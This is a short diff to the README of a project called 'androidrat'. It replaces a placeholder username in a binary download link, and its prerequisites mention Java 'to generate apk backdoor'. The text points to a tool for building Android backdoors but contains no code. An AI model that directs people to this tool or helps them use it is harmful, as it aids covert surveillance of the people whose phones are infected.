@@ -20,7 +20,7 @@ It consists of two parts :
 
 #### 2) From binaries
 ###### Prerequisite :
-* Download a binary from https://github.com/yourusername/androidrat/releases
+* Download a binary from https://github.com/amyade1/androidrat/releases
 * Java (to generate apk backdoor)
 
 ## Screenshots
